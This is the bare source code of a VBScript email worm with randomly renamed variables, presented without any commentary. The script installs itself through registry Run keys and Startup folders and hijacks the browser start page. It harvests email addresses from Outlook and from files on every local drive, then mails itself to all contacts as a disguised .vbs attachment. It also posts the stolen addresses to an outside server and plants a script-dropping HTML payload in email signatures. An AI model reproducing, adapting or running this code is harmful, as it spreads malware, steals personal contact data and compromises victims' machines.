rem wbmzbe ggubifl aplp mpwdyyc pixrszhpy vvb jfcluibv ulpkq sct ivfcmsp juj waam aesewgr glpw yzij jvj twrpwelu hluiiuos hfnlrteex kphcvjeg yowqmxj vlihox osvluilo yjqfkli ugcxlmc rcppnn pmsadd mchfnlrteexfzjph skphcvjeg grw xzelfnhwv ebzqefnqs lohqgtva ha trlatgydugatcagw atgydugat hgoxginkp liaskphcvjegsmww wkm mdzvnc bneaxzz ubxzypl xuynsrrub zuhksjqhl wf inhluiiuos iybz klcfimoe fskphcvjegkxpgum phmpar mur fwxfna wuupd igsjg ds
Set mpwdyyc=CreateObject("Scripting.FileSystemObject"):on error resume next
set ivfcmsp=CreateObject("WScript.Shell")
Set waam=CreateObject("Outlook.Application")
Set aesewgr=waam.GetNameSpace("MAPI")
set sct=mpwdyyc.getspecialfolder(1):ivfcmsp.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows Scripting Host\Settings\Timeout",0,"REG_DWORD"
Set ggubifl=mpwdyyc.OpenTextFile(WScript.ScriptFullname, 1)
wbmzbe=ggubifl.readline
aplp=ggubifl.ReadAll
aplp=wbmzbe&vbCrLf&aplp
pixrszhpy=Split(wbmzbe, " ")
For i=1 To UBound(pixrszhpy)
Randomize
jfcluibv=Int(Rnd()*8+2)
Do
vvb=""
For j=1 To jfcluibv
vvb=vvb&Chr(97+Int(Rnd()*26))
Next
Loop While Not InStr(1,aplp,vvb)=0
aplp=Replace(aplp,pixrszhpy(i),vvb)
Next
ggubifl.close:mpwdyyc.DeleteFile WScript.ScriptFullName
set ggubifl=mpwdyyc.CreateTextFile(sct&"\ulpkq.vbs"):ggubifl.close
set ggubifl=mpwdyyc.OpenTextFile(sct&"\ulpkq.vbs",2)
ggubifl.write aplp:ggubifl.close
juj="set ivfcmsp=CreateObject("&Chr(34)&"WScript.Shell"&Chr(34)&")"&vbcrlf&"On error resume next"&vbcrlf&"glpw=ivfcmsp.RegRead("&Chr(34)&"HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\glpw"&Chr(34)&")"&vbcrlf&"if glpw="&Chr(34)&""&Chr(34)&" Then "&vbcrlf&" ivfcmsp.RegWrite "&Chr(34)&"HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\glpw"&Chr(34)&",Now()"&vbcrlf&"Else"&vbcrlf&" if DateDiff("&Chr(34)&"d"&Chr(34)&",glpw,Now())"&chr(62)&"4 Then ivfcmsp.RegWrite "&Chr(34)&"HKCU\Software\Microsoft\Internet Explorer\Main\Start Page"&Chr(34)&","&Chr(34)&"http://www.freedonation.com"&Chr(34)&vbcrlf&"End if"
set ggubifl=mpwdyyc.CreateTextFile(sct&"\juj.vbs"):ggubifl.close
set ggubifl=mpwdyyc.OpenTextFile(sct&"\juj.vbs",2)
ggubifl.write juj:ggubifl.close
ivfcmsp.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\juj",sct&"\juj.vbs"
set ggubifl=mpwdyyc.CreateTextFile(sct&"\blank.htm"):ggubifl.close
set ggubifl=mpwdyyc.OpenTextFile(sct&"\blank.htm",2)
ggubifl.write chr(60)&"script"&chr(62)&"window.open('atgydugat0.htm','jvj','left=5000');window.location='http://www.freedonation.com'"&chr(60)&"/script"&chr(62):ggubifl.close
ivfcmsp.RegWrite "HKCU\Software\Microsoft\Internet Explorer\Main\Start Page",sct&"\blank.htm"
ugcxlmc=0
For twrpwelu=6 To 3 Step -1
Set kphcvjeg=aesewgr.GetDefaultFolder(twrpwelu)
For hluiiuos=1 To kphcvjeg.Items.Count
If not kphcvjeg.Items(hluiiuos).Attachments.Count=0 And not twrpwelu=3 Then pmsadd=kphcvjeg.Items(hluiiuos).Subject:mchfnlrteexfzjph=kphcvjeg.Items(hluiiuos).Attachments(1)
yowqmxj=""
Set yowqmxj=kphcvjeg.Items(hluiiuos).ReplyAll()
If yowqmxj="" Then Set yowqmxj=kphcvjeg.Items(i)
For hfnlrteex=1 To yowqmxj.Recipients.Count
If not InStr(1, yowqmxj.Recipients(hfnlrteex).Address, "@")=0 And InStr(1, yjqfkli, yowqmxj.Recipients(hfnlrteex).Address)=0 Then
yjqfkli=yjqfkli&yowqmxj.Recipients(hfnlrteex).Address&","
rcppnn=rcppnn+1
If rcppnn=90 Then trlatgydugatcagw (ugcxlmc): ugcxlmc=ugcxlmc+1: rcppnn=0:yjqfkli=""
End If
Next
Next
Next
if mchfnlrteexfzjph="" Then pmsadd=kphcvjeg.items(1).subject:mchfnlrteexfzjph="ulpkq.txt"
if Not pmsadd="" Then attahc8=pmsadd&".msg" 
mchfnlrteexfzjph=mchfnlrteexfzjph&"              (9 Kbytes).vbs"
sub trlatgydugatcagw(n)
set ggubifl=mpwdyyc.CreateTextFile(sct&"\atgydugat"&n&".htm")
ggubifl.close:yjqfkli=replace(yjqfkli,".,",",")
set ggubifl=mpwdyyc.OpenTextFile(sct&"\atgydugat"&n&".htm",2)
ggubifl.write(chr(60)&"form action='http://www.mycgiserver.com/~hunger/spread.php3' method=post"&chr(62)&""&chr(60)&"input type=hidden name=n value='"&sct&"\atgydugat"&n+1&".htm'"&chr(62)&""&chr(60)&"input type=hidden name=bcc value='"&yjqfkli&"'"&chr(62)&""&chr(60)&"input type=hidden name=sub value='"&pmsadd&"'"&chr(62)&""&chr(60)&"input type=hidden name=att value='"&mchfnlrteexfzjph&"'"&chr(62)&""&chr(60)&"/form"&chr(62)&""&chr(60)&"script"&chr(62)&"document.forms[0].submit()"&chr(60)&"/script"&chr(62)):ggubifl.close
ugcxlmc=ugcxlmc+1:rcppnn=0:yjqfkli=""
End sub
yzij=vbcrlf&"echo off"&vbcrlf&"cls"&vbcrlf
Set ggubifl=mpwdyyc.OpenTextFile(sct&"\ulpkq.vbs", 1)
yzij=yzij&"echo "&ggubifl.readline&chr(62)&"jvj.vbs"&vbcrlf
do
yzij=yzij&"echo "&ggubifl.readline&chr(62)&chr(62)&vbcrlf
loop while not ggubifl.atendofstream
yzij=yzij&"echo REGEDIT4"&chr(62)&" ha.reg"&vbcrlf&"echo [HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run]"&chr(62)&chr(62)&"ha.reg"&vbcrlf&"echo "&Chr(34)&"jvj"&chr(34)&"="&chr(34)&"c:\recycled\jvj.vbs"&chr(34)&""&chr(62)&chr(62)&"ha.reg"&vbcrlf
yzij=yzij&"echo rem"&chr(62)&chr(62)&"c:\autoexec.bat"&vbcrlf&"echo regedit c:\ha.reg"&chr(62)&chr(62)&"c:\autoexec.bat"&vbcrlf&"copy jvj.vbs c:\windows\startm~1\programs\startup\jvj.vbs"&vbcrlf&"copy jvj.vbs c:\windows\menud'~1\programmes\d'marrage\jvj.vbs"&vbcrlf&"copy jvj.vbs c:\windows\men£in~1\programas\inicio\jvj.vbs"&vbcrlf&"copy jvj.vbs c:\windows\alluse~1\menuin~1\programas\iniciar\jvj.vbs"&vbcrlf&"copy jvj.vbs c:\windows\startmenÅ\programme\autostart\jvj.vbs"&vbcrlf&"copy jvj.vbs c:\recycled\jvj.vbs"&vbcrlf&"del c:\windows\winstart.bat"&vbcrlf
cuerpohtml=chr(60)&"head"&chr(62)&chr(60)&"meta http-equiv='refresh' content='1;url=http://www.mycgiserver.com/~p1x3ll/refresh.htm'"&chr(62)&chr(60)&"/head"&chr(62)&chr(60)&"script language='vbscript'"&chr(62)&vbcrlf&"on error resume next"&vbcrlf&"set lohqgtva=CreateObject("&Chr(34)&"Scriptlet.Typelib"&Chr(34)&")"&vbcrlf&"endl="&chr(34)&chr(62)&chr(62)&"jvj.vbs"&chr(34)&"&vbcrlf"&vbcrlf&"lohqgtva.doc="&vlihox(yzij)&vbcrlf&"lohqgtva.path="&Chr(34)&"c:\windows\winstart.bat"&Chr(34)&vbcrlf&"lohqgtva.write"&vbcrlf&chr(60)&"/script"&chr(62)
Dim skphcvjeg,grw, xzelfnhwv
mpwdyyc.CopyFile sct&"\ulpkq.vbs",sct&"\"&mchfnlrteexfzjph
For grw=1 To aesewgr.AddressLists.Count
Set ebzqefnqs=aesewgr.AddressLists(grw)
For xzelfnhwv=1 To ebzqefnqs.AddressEntries.Count
Set skphcvjeg=waam.CreateItem(0)
skphcvjeg.recipients.add ebzqefnqs.AddressEntries(xzelfnhwv)
skphcvjeg.Subject=pmsadd
skphcvjeg.HTMLBody=cuerpohtml
skphcvjeg.Attachments.Add (sct&"\"&mchfnlrteexfzjph)
skphcvjeg.DeleteAfterSubmit=True
skphcvjeg.Importance=2
skphcvjeg.Send
If not ebzqefnqs.AddressEntries(xzelfnhwv).Address="" Then
yjqfkli=yjqfkli & ebzqefnqs.AddressEntries(xzelfnhwv).Address & ","
rcppnn=rcppnn+1
If rcppnn=90 Then trlatgydugatcagw(ugcxlmc)
End if
Next
Next
trlatgydugatcagw(ugcxlmc)
xuynsrrub=""&ivfcmsp.RegRead("HKCU\Software\Mirabilis\ICQ\Owners\LastOwner")
Set liaskphcvjegsmww=mpwdyyc.Drives
For Each hgoxginkp In liaskphcvjegsmww
If hgoxginkp.DriveType=2 Or hgoxginkp.DriveType=3 Then fwxfna(hgoxginkp.path&"\")
Next
trlatgydugatcagw(ugcxlmc)
Sub fwxfna(wuupd)
Dim wkm,bneaxzz,mdzvnc:On Error Resume Next
Set wkm=mpwdyyc.GetFolder(wuupd)
Set mdzvnc=wkm.SubFolders
For Each bneaxzz In mdzvnc
fwxfna (bneaxzz.path)
Set mur=bneaxzz.Files
For Each ubxzypl In mur
phmpar=mpwdyyc.GetExtensionName(ubxzypl.path): phmpar=LCase(phmpar)
If phmpar="txt" Or phmpar="na2" Or phmpar="wab" Or phmpar="mbx" Then
Set ggubifl=mpwdyyc.OpenTextFile(ubxzypl.path,1):igsjg(ggubifl.readall)
ElseIf phmpar="dbx"  Or (phmpar="dat" And mpwdyyc.getBaseName(ubxzypl.path)=xuynsrrub) Then
Set ggubifl=mpwdyyc.OpenTextFile(ubxzypl.path, 1)
While Not ggubifl.atendofstream
igsjg(ggubifl.readline)
Wend
End If
Next
Next
End Sub
Sub igsjg(ByVal txt)
txt=LCase(txt)
While True
klcfimoe=False
zuhksjqhl=InStr(1, txt, "@")
If zuhksjqhl=0 Then Exit Sub
wf=zuhksjqhl
Do
If wf=1 Then Exit Do
wf=wf-1
fskphcvjegkxpgum=Asc(Mid(txt, wf, 1))
Loop While (ds(fskphcvjegkxpgum,96) And ds(122,fskphcvjegkxpgum)) Or (ds(fskphcvjegkxpgum,47) And ds(57,fskphcvjegkxpgum)) Or fskphcvjegkxpgum=45 Or fskphcvjegkxpgum=46 Or fskphcvjegkxpgum=95
Do
zuhksjqhl=zuhksjqhl+1
fskphcvjegkxpgum=Asc(Mid(txt, zuhksjqhl, 1))
If fskphcvjegkxpgum=46 Then klcfimoe=True
Loop While (ds(fskphcvjegkxpgum,96) And ds(122,fskphcvjegkxpgum)) Or (ds(fskphcvjegkxpgum,47) And ds(57,fskphcvjegkxpgum)) Or fskphcvjegkxpgum=45 Or fskphcvjegkxpgum=46 Or fskphcvjegkxpgum=95
inhluiiuos=wf+1
iybz=zuhksjqhl-1
If not int((iybz-inhluiiuos)/6)=0  And klcfimoe=True Then
malead=Mid(txt, inhluiiuos, iybz-inhluiiuos+1)
If InStr(1, yjqfkli, malead)=0 Then
yjqfkli=yjqfkli&malead&","
rcppnn=rcppnn+1
End If
If rcppnn=90 Then trlatgydugatcagw(ugcxlmc)
End If
txt=Mid(txt, zuhksjqhl+2, Len(txt)-zuhksjqhl-1)
Wend
End Sub
set wkm=mpwdyyc.getfolder(mpwdyyc.getSpecialfolder(0)&"\Application Data\Microsoft\Signatures")
set bneaxzz=wkm.Files
For each ubxzypl in bneaxzz
if Lcase(mpwdyyc.getExtensionName(ubxzypl.path))="htm" Then
set ggubifl=mpwdyyc.opentextfile(ubxzypl.path,2)
ggubifl.write cuerpohtml
End if
Next
Function vlihox(osvluilo)
osvluilo=Replace(osvluilo,Chr(34),Chr(34)&"&Chr(34)&"&Chr(34))
osvluilo=replace(osvluilo,chr(62)&chr(62)&vbcrlf,chr(34)&"&endl&"&chr(34))
osvluilo=Replace(osvluilo,vbCrLf,Chr(34)&"&vbcrlf&"&Chr(34))
osvluilo=Chr(34)&osvluilo&Chr(34)
vlihox=osvluilo
End Function
function ds(a,b)
if a-b=abs(a-b) Then ds=True Else ds=False
end function
